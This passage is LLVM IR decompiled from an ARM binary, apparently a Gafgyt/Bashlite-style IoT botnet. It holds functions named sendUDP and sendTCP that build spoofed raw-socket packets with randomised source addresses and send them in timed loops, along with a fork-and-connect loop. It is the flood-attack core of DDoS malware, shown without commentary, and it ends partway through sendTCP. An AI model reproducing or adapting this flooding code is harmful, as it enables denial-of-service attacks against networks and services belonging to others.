  store i32 %v2_c7e8, i32* @r0, align 4
  %v8_c808 = call i32 @sprintf(i32 %v2_c7e8, i32 ptrtoint ([64 x i8]* @global_var_1cecc.465 to i32), i32 %arg1, i32 %arg4, i32 %arg2, i32 %v7_c7e4, i32 %v2_c7bc)
  store i32 %v8_c808, i32* @r0, align 4
  %v0_c80c = call i32 @__libc_fork()
  %v2_c814 = icmp eq i32 %v0_c80c, 0
  br i1 %v2_c814, label %dec_label_pc_c8b0, label %dec_label_pc_c890

dec_label_pc_c820:                                ; preds = %dec_label_pc_c890
  %v5_c838 = call i32 @socket_connect(i32 %arg2, i16 %arg3, i32 %v13_c750)
  %v2_c848 = icmp eq i32 %v5_c838, 0
  br i1 %v2_c848, label %dec_label_pc_c890, label %dec_label_pc_c850

dec_label_pc_c850:                                ; preds = %dec_label_pc_c820
  %v3_c858 = call i32 @strlen(i8* %tmp23)
  %v2_c86c = call i32 @__GI_write(i32 %v5_c838, i32 %v2_c7e8)
  %v1_c884 = call i32 @__GI_read(i32 %v5_c838)
  %v1_c88c = call i32 @__GI_close(i32 %v5_c838)
  br label %dec_label_pc_c890

dec_label_pc_c890:                                ; preds = %dec_label_pc_c820, %dec_label_pc_c850, %dec_label_pc_c7a4
  %v2_c894 = call i32 @__GI_time(i32* null)
  %v5_c8a4 = icmp slt i32 %v2_c894, %v2_c788
  br i1 %v5_c8a4, label %dec_label_pc_c820, label %dec_label_pc_c8a8

dec_label_pc_c8a8:                                ; preds = %dec_label_pc_c890
  %v2_c8ac = call i32 @__GI_exit(i16 0)
  br label %dec_label_pc_c8b0

dec_label_pc_c8b0:                                ; preds = %dec_label_pc_c7a4, %dec_label_pc_c8a8
  %v1_c8d43 = phi i32 [ 0, %dec_label_pc_c7a4 ], [ %v2_c8ac, %dec_label_pc_c8a8 ]
  %v1_c8b4 = add nuw nsw i32 %storemerge132, 1
  %v5_c8c8 = icmp slt i32 %v1_c8b4, %arg6
  br i1 %v5_c8c8, label %dec_label_pc_c7a4, label %dec_label_pc_c8cc

dec_label_pc_c8cc:                                ; preds = %dec_label_pc_c8b0, %entry
  %v1_c8d4.lcssa = phi i32 [ %v2_c77c, %entry ], [ %v1_c8d43, %dec_label_pc_c8b0 ]
  ret i32 %v1_c8d4.lcssa

; uselistorder directives
  uselistorder i32 %v1_c8b4, { 1, 0 }
  uselistorder i32 %v2_c7e8, { 1, 0, 2 }
  uselistorder i32* %stack_var_0, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg6, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_c8b0, { 1, 0 }
  uselistorder label %dec_label_pc_c890, { 1, 0, 2 }
  uselistorder label %dec_label_pc_c7a4, { 1, 0 }
}

define i32 @"$d.2"(i32 %arg1, i32 %arg2, i16* %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_c8d8:
  %v0_c8d8 = load i1, i1* @cpsr_c, align 1
  br i1 %v0_c8d8, label %bb1, label %bb

bb:                                               ; preds = %dec_label_pc_c8d8
  %v2_c8d8 = inttoptr i32 %arg4 to i32*
  store i32 %arg1, i32* %v2_c8d8, align 4
  %v4_c8d8 = add i32 %arg4, 4
  %v5_c8d8 = inttoptr i32 %v4_c8d8 to i32*
  store i32 %arg4, i32* %v5_c8d8, align 4
  %v7_c8d8 = add i32 %arg4, 8
  %v8_c8d8 = inttoptr i32 %v7_c8d8 to i32*
  %v9_c8d8 = load i32, i32* @r4, align 4
  store i32 %v9_c8d8, i32* %v8_c8d8, align 4
  %v10_c8d8 = add i32 %arg4, 12
  %v11_c8d8 = inttoptr i32 %v10_c8d8 to i32*
  %v12_c8d8 = load i32, i32* @r5, align 4
  store i32 %v12_c8d8, i32* %v11_c8d8, align 4
  %v13_c8d8 = add i32 %arg4, 16
  %v14_c8d8 = inttoptr i32 %v13_c8d8 to i32*
  %v15_c8d8 = load i32, i32* @sb, align 4
  store i32 %v15_c8d8, i32* %v14_c8d8, align 4
  %v16_c8d8 = add i32 %arg4, 20
  %v17_c8d8 = inttoptr i32 %v16_c8d8 to i32*
  %v18_c8d8 = load i32, i32* @sl, align 4
  store i32 %v18_c8d8, i32* %v17_c8d8, align 4
  %v19_c8d8 = add i32 %arg4, 24
  %v20_c8d8 = inttoptr i32 %v19_c8d8 to i32*
  %v21_c8d8 = load i32, i32* @fp, align 4
  store i32 %v21_c8d8, i32* %v20_c8d8, align 4
  %v22_c8d8 = add i32 %arg4, 28
  %v23_c8d8 = inttoptr i32 %v22_c8d8 to i32*
  store i32 ptrtoint (i32* @global_var_c8e0.464 to i32), i32* %v23_c8d8, align 4
  br label %bb1

bb1:                                              ; preds = %dec_label_pc_c8d8, %bb
  %v0_c8dc = load i1, i1* @cpsr_z, align 1
  br i1 %v0_c8dc, label %bb2, label %.thread

bb2:                                              ; preds = %bb1
  %v1_c8dc = load i32, i32* @r6, align 4
  %v2_c8dc = trunc i32 %v1_c8dc to i16
  store i16 %v2_c8dc, i16* %arg3, align 2
  br label %.thread

.thread:                                          ; preds = %bb1, %bb2
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %arg4, { 8, 7, 6, 5, 4, 3, 0, 2, 1 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb1, { 1, 0 }
}

define i32 @sendUDP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-84 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  store i32 51440, i32* %stack_var_-4, align 4
  %v2_c8ec = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_c8ec, i32* @fp, align 4
  store i32 2, i32* %stack_var_-80, align 4
  %v2_c910 = icmp eq i32 %arg2, 0
  br i1 %v2_c910, label %dec_label_pc_c918, label %dec_label_pc_c930

dec_label_pc_c918:                                ; preds = %entry
  %v0_c918 = call i32 @rand_cmwc()
  br label %dec_label_pc_c94c

dec_label_pc_c930:                                ; preds = %entry
  %v3_c938 = urem i32 %arg2, 65536
  %v1_c940 = call i32 @__GI_htons(i32 %v3_c938)
  br label %dec_label_pc_c94c

dec_label_pc_c94c:                                ; preds = %dec_label_pc_c918, %dec_label_pc_c930
  %v3_c95c = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-76)
  %v2_c964 = icmp eq i32 %v3_c95c, 0
  br i1 %v2_c964, label %dec_label_pc_c96c, label %dec_label_pc_cf54

dec_label_pc_c96c:                                ; preds = %dec_label_pc_c94c
  store i32 8, i32* @r2, align 4
  %v2_c980 = bitcast i32* %stack_var_-72 to i8*
  %v3_c980 = call i32 @__GI_memset(i8* %v2_c980, i32 0)
  store i32 %arg6, i32* %r2.global-to-local, align 4
  %v7_c990 = icmp eq i32 %arg4, 32
  br i1 %v7_c990, label %dec_label_pc_c998, label %dec_label_pc_cb1c

dec_label_pc_c998:                                ; preds = %dec_label_pc_c96c
  store i32 17, i32* @r2, align 4
  %v3_c9a4 = call i32 @socket(i32 2, i32 2, i32 17)
  %v2_c9b4 = icmp eq i32 %v3_c9a4, 0
  br i1 %v2_c9b4, label %dec_label_pc_c9bc, label %dec_label_pc_c9d4

dec_label_pc_c9bc:                                ; preds = %dec_label_pc_c998
  %v2_c9c0 = load i32, i32* @global_var_272d0.45, align 4
  %v3_c9cc = call i32 @Rootsprintf(i32 %v2_c9c0, i32 ptrtoint ([27 x i8]* @global_var_1cf0c.468 to i32))
  br label %dec_label_pc_cf54

dec_label_pc_c9d4:                                ; preds = %dec_label_pc_c998
  %v3_c9d4 = load i32, i32* %stack_var_0, align 4
  %v1_c9d8 = add i32 %v3_c9d4, 1
  %v1_c9e0 = call i32 @malloc(i32 %v1_c9d8)
  %v2_c9f0 = icmp eq i32 %v1_c9e0, 0
  br i1 %v2_c9f0, label %dec_label_pc_cf54, label %dec_label_pc_c9f8

dec_label_pc_c9f8:                                ; preds = %dec_label_pc_c9d4
  %v3_c9f8 = load i32, i32* %stack_var_0, align 4
  %v1_c9fc = add i32 %v3_c9f8, 1
  store i32 %v1_c9fc, i32* @r2, align 4
  %v2_ca0c = inttoptr i32 %v1_c9e0 to i8*
  %v3_ca0c = call i32 @__GI_memset(i8* %v2_ca0c, i32 0)
  %v2_ca18 = call i32 @makeRandomStr(i32 %v1_c9e0, i32 %v3_c9f8)
  %v2_ca20 = call i32 @__GI_time(i32* null)
  %v2_ca2c = add i32 %v2_ca20, %arg3
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_ca48 = ptrtoint i32* %stack_var_-80 to i32
  %v3_cae4 = mul i32 %arg8, 4
  %v3_caf4 = mul i32 %arg8, 1000
  br label %dec_label_pc_ca44.outer

dec_label_pc_ca44.outer:                          ; preds = %dec_label_pc_cb0c, %dec_label_pc_cadc, %dec_label_pc_c9f8
  %stack_var_-120.0.ph = phi i32 [ 0, %dec_label_pc_c9f8 ], [ %v1_cac4, %dec_label_pc_cadc ], [ %v1_cac4, %dec_label_pc_cb0c ]
  %stack_var_-116.0.ph = phi i32 [ 0, %dec_label_pc_c9f8 ], [ 0, %dec_label_pc_cadc ], [ %v1_cb10, %dec_label_pc_cb0c ]
  br label %dec_label_pc_ca44

dec_label_pc_ca44:                                ; preds = %dec_label_pc_ca44.outer, %dec_label_pc_cab4
  %stack_var_-120.0 = phi i32 [ 0, %dec_label_pc_cab4 ], [ %stack_var_-120.0.ph, %dec_label_pc_ca44.outer ]
  %v3_ca44 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_ca44, i32* %r2.global-to-local, align 4
  %v6_ca68 = call i32 @__libc_sendto(i32 %v3_c9a4, i32 %v1_c9e0, i32 %v3_ca44, i32 0, i32 %v2_ca48, i32 16)
  store i32 %arg6, i32* %r2.global-to-local, align 4
  %v9_ca74 = icmp eq i32 %stack_var_-120.0, %arg6
  br i1 %v9_ca74, label %dec_label_pc_ca7c, label %dec_label_pc_cac0

dec_label_pc_ca7c:                                ; preds = %dec_label_pc_ca44
  br i1 %v2_c910, label %dec_label_pc_ca88, label %dec_label_pc_ca9c

dec_label_pc_ca88:                                ; preds = %dec_label_pc_ca7c
  %v0_ca88 = call i32 @rand_cmwc()
  br label %dec_label_pc_ca9c

dec_label_pc_ca9c:                                ; preds = %dec_label_pc_ca7c, %dec_label_pc_ca88
  %v2_caa0 = call i32 @__GI_time(i32* null)
  store i32 %v2_caa0, i32* %r2.global-to-local, align 4
  %v8_cab0 = icmp sgt i32 %v2_caa0, %v2_ca2c
  br i1 %v8_cab0, label %dec_label_pc_cf54, label %dec_label_pc_cab4

dec_label_pc_cab4:                                ; preds = %dec_label_pc_ca9c
  br label %dec_label_pc_ca44

dec_label_pc_cac0:                                ; preds = %dec_label_pc_ca44
  %v1_cac4 = add i32 %stack_var_-120.0, 1
  store i32 %stack_var_-116.0.ph, i32* %r2.global-to-local, align 4
  %v9_cad4 = icmp eq i32 %stack_var_-116.0.ph, %arg7
  br i1 %v9_cad4, label %dec_label_pc_cadc, label %dec_label_pc_cb0c

dec_label_pc_cadc:                                ; preds = %dec_label_pc_cac0
  store i32 %v3_cae4, i32* %r2.global-to-local, align 4
  %v1_cafc = call i32 @usleep(i32 %v3_caf4)
  br label %dec_label_pc_ca44.outer

dec_label_pc_cb0c:                                ; preds = %dec_label_pc_cac0
  %v1_cb10 = add i32 %stack_var_-116.0.ph, 1
  store i32 %v1_cb10, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_ca44.outer

dec_label_pc_cb1c:                                ; preds = %dec_label_pc_c96c
  store i32 17, i32* @r2, align 4
  %v3_cb30 = call i32 @socket(i32 2, i32 3, i32 17)
  %v2_cb40 = icmp eq i32 %v3_cb30, 0
  br i1 %v2_cb40, label %dec_label_pc_cb48, label %dec_label_pc_cb60

dec_label_pc_cb48:                                ; preds = %dec_label_pc_cb1c
  %v2_cb4c = load i32, i32* @global_var_272d0.45, align 4
  %v3_cb58 = call i32 @Rootsprintf(i32 %v2_cb4c, i32 ptrtoint ([27 x i8]* @global_var_1cf0c.468 to i32))
  br label %dec_label_pc_cf50

dec_label_pc_cb60:                                ; preds = %dec_label_pc_cb1c
  store i32 1, i32* %stack_var_-84, align 4
  %v2_cb68 = ptrtoint i32* %stack_var_-84 to i32
  store i32 3, i32* @r2, align 4
  %v5_cb84 = call i32 @__GI_setsockopt(i32 %v3_cb30, i32 0, i32 3, i32 %v2_cb68, i32 4)
  %v1_cb8c = icmp slt i32 %v5_cb84, 0
  br i1 %v1_cb8c, label %dec_label_pc_cb94, label %dec_label_pc_cbac

dec_label_pc_cb94:                                ; preds = %dec_label_pc_cb60
  %v2_cb98 = load i32, i32* @global_var_272d0.45, align 4
  %v3_cba4 = call i32 @Rootsprintf(i32 %v2_cb98, i32 ptrtoint ([33 x i8]* @global_var_1cf28.470 to i32))
  br label %dec_label_pc_cf50

dec_label_pc_cbac:                                ; preds = %dec_label_pc_cb60
  br label %dec_label_pc_cbb8

dec_label_pc_cbb8:                                ; preds = %dec_label_pc_cbac, %dec_label_pc_cbb8
  %v1_cbf023 = phi i32 [ 49, %dec_label_pc_cbac ], [ %v1_cbf0, %dec_label_pc_cbb8 ]
  %v2_cbbc = call i32 @__GI_time(i32* null)
  store i32 %v2_cbbc, i32* @r4, align 4
  %v0_cbc8 = call i32 @rand_cmwc()
  %v0_cbd0 = load i32, i32* @r4, align 4
  %v2_cbd0 = xor i32 %v0_cbd0, %v0_cbc8
  %v1_cbd8 = call i32 @srand(i32 %v2_cbd0)
  %v0_cbdc = call i32 @rand()
  %v1_cbe8 = call i32 @init_rand(i32 %v0_cbdc)
  %v1_cbf0 = add nsw i32 %v1_cbf023, -1
  %v3_cbfc = icmp eq i32 %v1_cbf023, 0
  br i1 %v3_cbfc, label %dec_label_pc_cc04, label %dec_label_pc_cbb8

dec_label_pc_cc04:                                ; preds = %dec_label_pc_cbb8
  %v2_cc08 = icmp eq i32 %arg4, 0
  br i1 %v2_cc08, label %dec_label_pc_cc34, label %dec_label_pc_cc1c

dec_label_pc_cc1c:                                ; preds = %dec_label_pc_cc04
  %v1_cc20 = sub i32 32, %arg4
  store i32 %v1_cc20, i32* %r2.global-to-local, align 4
  %v1_cc2c = shl i32 -1, %v1_cc20
  br label %dec_label_pc_cc34

dec_label_pc_cc34:                                ; preds = %dec_label_pc_cc04, %dec_label_pc_cc1c
  %storemerge10 = phi i32 [ %v1_cc2c, %dec_label_pc_cc1c ], [ 0, %dec_label_pc_cc04 ]
  %v3_cc34 = load i32, i32* %stack_var_0, align 4
  %v1_cc38 = add i32 %v3_cc34, 28
  %v1_cc48 = add i32 %v3_cc34, 42
  %v3_cc4c = and i32 %v1_cc48, -8
  %v1_cc54 = load i32, i32* @sp, align 4
  %v2_cc54 = sub i32 %v1_cc54, %v3_cc4c
  %v1_cc58 = add i32 %v2_cc54, 8
  store i32 %v1_cc58, i32* %r2.global-to-local, align 4
  %v1_cc64 = add i32 %v2_cc54, 15
  %v3_cc68 = and i32 %v1_cc64, -8
  %v1_cc88 = add i32 %v3_cc68, 20
  %v5_cc8c = inttoptr i32 %v1_cc88 to i16*
  %v3_cc90 = load i32, i32* %stack_var_-76, align 4
  store i32 %v3_cc90, i32* @r4, align 4
  %v1_cc98 = call i32 @GetRandomIP(i32 %storemerge10)
  %v1_cca4 = call i32 @__GI_htonl(i32 %v1_cc98)
  store i32 %v1_cca4, i32* %r2.global-to-local, align 4
  %v3_ccac = load i32, i32* %stack_var_0, align 4
  %v1_ccb0 = add i32 %v3_ccac, 8
  %v1_ccb4 = load i32, i32* @sp, align 4
  %v2_ccb4 = inttoptr i32 %v1_ccb4 to i32*
  store i32 %v1_ccb0, i32* %v2_ccb4, align 4
  %v0_ccbc = load i32, i32* @r4, align 4
  %v4_ccc4 = inttoptr i32 %v3_cc68 to i8*
  %v5_ccc4 = call i32 @makeIPPacket(i8* %v4_ccc4, i32 %v0_ccbc, i32 %v1_cca4, i32 17)
  %v3_ccc8 = load i32, i32* %stack_var_0, align 4
  %fold = add i32 %v3_ccc8, 8
  %v3_ccdc = urem i32 %fold, 65536
  %v1_cce4 = call i32 @__GI_htons(i32 %v3_ccdc)
  %sext = mul i32 %v1_cce4, 65536
  %v1_cce8 = sdiv i32 %sext, 65536
  store i32 %v1_cce8, i32* %r2.global-to-local, align 4
  %v1_ccf4 = trunc i32 %v1_cce8 to i16
  %v3_ccf4 = add i32 %v3_cc68, 24
  %v4_ccf4 = inttoptr i32 %v3_ccf4 to i16*
  store i16 %v1_ccf4, i16* %v4_ccf4, align 8
  %v0_ccf8 = call i32 @rand_cmwc()
  %v3_cd04 = urem i32 %v0_ccf8, 65536
  store i32 %v3_cd04, i32* %r2.global-to-local, align 4
  %v1_cd0c = trunc i32 %v0_ccf8 to i16
  store i16 %v1_cd0c, i16* %v5_cc8c, align 4
  br i1 %v2_c910, label %dec_label_pc_cd1c, label %dec_label_pc_cd34

dec_label_pc_cd1c:                                ; preds = %dec_label_pc_cc34
  %v0_cd1c = call i32 @rand_cmwc()
  %extract.t = trunc i32 %v0_cd1c to i16
  br label %dec_label_pc_cd50

dec_label_pc_cd34:                                ; preds = %dec_label_pc_cc34
  %v3_cd3c = urem i32 %arg2, 65536
  %v1_cd44 = call i32 @__GI_htons(i32 %v3_cd3c)
  %extract.t91 = trunc i32 %v1_cd44 to i16
  br label %dec_label_pc_cd50

dec_label_pc_cd50:                                ; preds = %dec_label_pc_cd1c, %dec_label_pc_cd34
  %v0_cd1c.sink.off0 = phi i16 [ %extract.t, %dec_label_pc_cd1c ], [ %extract.t91, %dec_label_pc_cd34 ]
  %v3_ce3c.pre-phi = phi i32 [ 0, %dec_label_pc_cd1c ], [ %v3_cd3c, %dec_label_pc_cd34 ]
  %v3_cd58 = add i32 %v3_cc68, 22
  %v4_cd58 = inttoptr i32 %v3_cd58 to i16*
  store i16 %v0_cd1c.sink.off0, i16* %v4_cd58, align 2
  store i32 %v1_cc88, i32* %r2.global-to-local, align 4
  %v3_cd64 = add i32 %v3_cc68, 26
  %v4_cd64 = inttoptr i32 %v3_cd64 to i16*
  store i16 0, i16* %v4_cd64, align 2
  %v1_cd6c = add i32 %v3_cc68, 28
  %v3_cd74 = load i32, i32* %stack_var_0, align 4
  %v2_cd78 = call i32 @makeRandomStr(i32 %v1_cd6c, i32 %v3_cd74)
  store i32 %v3_cc68, i32* %r2.global-to-local, align 4
  %v1_cd88 = or i32 %v3_cc68, 2
  %v2_cd88 = inttoptr i32 %v1_cd88 to i16*
  %v3_cd88 = load i16, i16* %v2_cd88, align 2
  %v4_cd88 = zext i16 %v3_cd88 to i32
  %v2_cd94 = inttoptr i32 %v3_cc68 to i16*
  %v3_cd94 = call i32 @csum(i16* %v2_cd94, i32 %v4_cd88)
  %sext4 = mul i32 %v3_cd94, 65536
  %v1_cd98 = sdiv i32 %sext4, 65536
  store i32 %v1_cd98, i32* %r2.global-to-local, align 4
  %v1_cda4 = trunc i32 %v1_cd98 to i16
  %v3_cda4 = add i32 %v3_cc68, 10
  %v4_cda4 = inttoptr i32 %v3_cda4 to i16*
  store i16 %v1_cda4, i16* %v4_cda4, align 2
  %v2_cdac = call i32 @__GI_time(i32* null)
  %v2_cdb8 = add i32 %v2_cdac, %arg3
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_cdd4 = ptrtoint i32* %stack_var_-80 to i32
  %v3_ce70 = or i32 %v3_cc68, 4
  %v4_ce70 = inttoptr i32 %v3_ce70 to i16*
  %v2_ce90 = add i32 %v3_cc68, 12
  %v3_ce90 = inttoptr i32 %v2_ce90 to i32*
  %v3_cf18 = mul i32 %arg8, 4
  %v3_cf28 = mul i32 %arg8, 1000
  br label %dec_label_pc_cdd0.outer

dec_label_pc_cdd0.outer:                          ; preds = %dec_label_pc_cf40, %dec_label_pc_cf10, %dec_label_pc_cd50
  %stack_var_-112.0.ph = phi i32 [ 0, %dec_label_pc_cd50 ], [ %v1_cef8, %dec_label_pc_cf10 ], [ %v1_cef8, %dec_label_pc_cf40 ]
  %stack_var_-108.0.ph = phi i32 [ 0, %dec_label_pc_cd50 ], [ 0, %dec_label_pc_cf10 ], [ %v1_cf44, %dec_label_pc_cf40 ]
  br label %dec_label_pc_cdd0

dec_label_pc_cdd0:                                ; preds = %dec_label_pc_cdd0.outer, %dec_label_pc_cee8
  %stack_var_-112.0 = phi i32 [ 0, %dec_label_pc_cee8 ], [ %stack_var_-112.0.ph, %dec_label_pc_cdd0.outer ]
  store i32 %v3_cc68, i32* %r2.global-to-local, align 4
  %v1_cdd8 = load i32, i32* @sp, align 4
  %v2_cdd8 = inttoptr i32 %v1_cdd8 to i32*
  store i32 %v2_cdd4, i32* %v2_cdd8, align 4
  %v1_cde0 = load i32, i32* @sp, align 4
  %v2_cde0 = add i32 %v1_cde0, 4
  %v3_cde0 = inttoptr i32 %v2_cde0 to i32*
  store i32 16, i32* %v3_cde0, align 4
  %v0_cde8 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v1_cc38, i32* %r2.global-to-local, align 4
  %v6_cdf4 = call i32 @__libc_sendto(i32 %v3_cb30, i32 %v0_cde8, i32 %v1_cc38, i32 0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_cdf8 = call i32 @rand_cmwc()
  %v3_ce04 = urem i32 %v0_cdf8, 65536
  store i32 %v3_ce04, i32* %r2.global-to-local, align 4
  %v1_ce0c = trunc i32 %v0_cdf8 to i16
  store i16 %v1_ce0c, i16* %v5_cc8c, align 4
  br i1 %v2_c910, label %dec_label_pc_ce1c, label %dec_label_pc_ce34

dec_label_pc_ce1c:                                ; preds = %dec_label_pc_cdd0
  %v0_ce1c = call i32 @rand_cmwc()
  %extract.t92 = trunc i32 %v0_ce1c to i16
  br label %dec_label_pc_ce50

dec_label_pc_ce34:                                ; preds = %dec_label_pc_cdd0
  %v1_ce44 = call i32 @__GI_htons(i32 %v3_ce3c.pre-phi)
  %extract.t93 = trunc i32 %v1_ce44 to i16
  br label %dec_label_pc_ce50

dec_label_pc_ce50:                                ; preds = %dec_label_pc_ce1c, %dec_label_pc_ce34
  %v0_ce1c.sink.off0 = phi i16 [ %extract.t92, %dec_label_pc_ce1c ], [ %extract.t93, %dec_label_pc_ce34 ]
  %v4_ce54 = sext i16 %v0_ce1c.sink.off0 to i32
  store i32 %v4_ce54, i32* %r2.global-to-local, align 4
  store i16 %v0_ce1c.sink.off0, i16* %v4_cd58, align 2
  %v0_ce5c = call i32 @rand_cmwc()
  %v3_ce68 = urem i32 %v0_ce5c, 65536
  store i32 %v3_ce68, i32* %r2.global-to-local, align 4
  %v1_ce70 = trunc i32 %v0_ce5c to i16
  store i16 %v1_ce70, i16* %v4_ce70, align 4
  %v1_ce78 = call i32 @GetRandomIP(i32 %storemerge10)
  %v1_ce84 = call i32 @__GI_htonl(i32 %v1_ce78)
  store i32 %v1_ce84, i32* %v3_ce90, align 4
  store i32 %v3_cc68, i32* %r2.global-to-local, align 4
  %v3_cea0 = load i16, i16* %v2_cd88, align 2
  %v4_cea0 = zext i16 %v3_cea0 to i32
  %v3_ceac = call i32 @csum(i16* %v2_cd94, i32 %v4_cea0)
  %v1_cebc = trunc i32 %v3_ceac to i16
  store i16 %v1_cebc, i16* %v4_cda4, align 2
  store i32 %arg6, i32* %r2.global-to-local, align 4
  %v9_cec8 = icmp eq i32 %stack_var_-112.0, %arg6
  br i1 %v9_cec8, label %dec_label_pc_ced0, label %dec_label_pc_cef4

dec_label_pc_ced0:                                ; preds = %dec_label_pc_ce50
  %v2_ced4 = call i32 @__GI_time(i32* null)
  store i32 %v2_ced4, i32* %r2.global-to-local, align 4
  %v8_cee4 = icmp sgt i32 %v2_ced4, %v2_cdb8
  br i1 %v8_cee4, label %dec_label_pc_cf50, label %dec_label_pc_cee8

dec_label_pc_cee8:                                ; preds = %dec_label_pc_ced0
  br label %dec_label_pc_cdd0

dec_label_pc_cef4:                                ; preds = %dec_label_pc_ce50
  %v1_cef8 = add i32 %stack_var_-112.0, 1
  store i32 %stack_var_-108.0.ph, i32* %r2.global-to-local, align 4
  %v9_cf08 = icmp eq i32 %stack_var_-108.0.ph, %arg7
  br i1 %v9_cf08, label %dec_label_pc_cf10, label %dec_label_pc_cf40

dec_label_pc_cf10:                                ; preds = %dec_label_pc_cef4
  store i32 %v3_cf18, i32* %r2.global-to-local, align 4
  %v1_cf30 = call i32 @usleep(i32 %v3_cf28)
  br label %dec_label_pc_cdd0.outer

dec_label_pc_cf40:                                ; preds = %dec_label_pc_cef4
  %v1_cf44 = add i32 %stack_var_-108.0.ph, 1
  store i32 %v1_cf44, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_cdd0.outer

dec_label_pc_cf50:                                ; preds = %dec_label_pc_ced0, %dec_label_pc_cb94, %dec_label_pc_cb48
  %v1_cf5c30 = phi i32 [ %v3_cba4, %dec_label_pc_cb94 ], [ %v3_cb58, %dec_label_pc_cb48 ], [ %v2_ced4, %dec_label_pc_ced0 ]
  br label %dec_label_pc_cf54

dec_label_pc_cf54:                                ; preds = %dec_label_pc_ca9c, %dec_label_pc_c94c, %dec_label_pc_c9d4, %dec_label_pc_c9bc, %dec_label_pc_cf50
  %v1_cf5c = phi i32 [ %v3_c95c, %dec_label_pc_c94c ], [ 0, %dec_label_pc_c9d4 ], [ %v3_c9cc, %dec_label_pc_c9bc ], [ %v1_cf5c30, %dec_label_pc_cf50 ], [ %v2_caa0, %dec_label_pc_ca9c ]
  ret i32 %v1_cf5c

; uselistorder directives
  uselistorder i32 %v1_cf44, { 1, 0 }
  uselistorder i32 %v1_cef8, { 1, 0 }
  uselistorder i32 %v0_ce5c, { 1, 0 }
  uselistorder i16 %v0_ce1c.sink.off0, { 1, 0 }
  uselistorder i32 %v0_cdf8, { 1, 0 }
  uselistorder i32 %stack_var_-108.0.ph, { 1, 2, 0 }
  uselistorder i32 %v1_cd98, { 1, 0 }
  uselistorder i32 %v3_cd3c, { 1, 0 }
  uselistorder i32 %v0_ccf8, { 1, 0 }
  uselistorder i32 %v1_cce8, { 1, 0 }
  uselistorder i32 %v3_cc68, { 6, 4, 5, 12, 3, 13, 11, 2, 10, 9, 8, 7, 1, 0 }
  uselistorder i32 %v1_cc38, { 1, 0 }
  uselistorder i32 %v1_cb10, { 1, 0 }
  uselistorder i32 %v1_cac4, { 1, 0 }
  uselistorder i32 %v3_ca44, { 1, 0 }
  uselistorder i32 %stack_var_-116.0.ph, { 1, 2, 0 }
  uselistorder i32* %stack_var_0, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-80, { 1, 2, 0 }
  uselistorder i32* %stack_var_-76, { 1, 0 }
  uselistorder i32* %stack_var_-84, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 0 }
  uselistorder i32 26, { 1, 0 }
  uselistorder i32 ()* @rand, { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 49, { 2, 0, 1 }
  uselistorder i32 (i32)* @usleep, { 1, 0 }
  uselistorder i32 (i32, i32)* @makeRandomStr, { 1, 0 }
  uselistorder i32 %arg8, { 3, 0, 2, 1 }
  uselistorder i32 %arg7, { 1, 0 }
  uselistorder i32 %arg6, { 1, 0, 3, 2, 4 }
  uselistorder label %dec_label_pc_cf54, { 4, 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_ce50, { 1, 0 }
  uselistorder label %dec_label_pc_cdd0, { 1, 0 }
  uselistorder label %dec_label_pc_cd50, { 1, 0 }
  uselistorder label %dec_label_pc_cc34, { 1, 0 }
  uselistorder label %dec_label_pc_cbb8, { 1, 0 }
  uselistorder label %dec_label_pc_ca9c, { 1, 0 }
  uselistorder label %dec_label_pc_ca44, { 1, 0 }
  uselistorder label %dec_label_pc_c94c, { 1, 0 }
}

define i32 @sendTCP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  store i32 53112, i32* %stack_var_-4, align 4
  %v2_cf74 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_cf74, i32* @fp, align 4
  store i32 2, i32* %stack_var_-68, align 4
  %v2_cfa8 = icmp eq i32 %arg2, 0
  br i1 %v2_cfa8, label %dec_label_pc_cfb0, label %dec_label_pc_cfc8

dec_label_pc_cfb0:                                ; preds = %entry
  %v0_cfb0 = call i32 @rand_cmwc()
  br label %dec_label_pc_cfe4

dec_label_pc_cfc8:                                ; preds = %entry
  %v3_cfd0 = urem i32 %arg2, 65536
  %v1_cfd8 = call i32 @__GI_htons(i32 %v3_cfd0)
  br label %dec_label_pc_cfe4

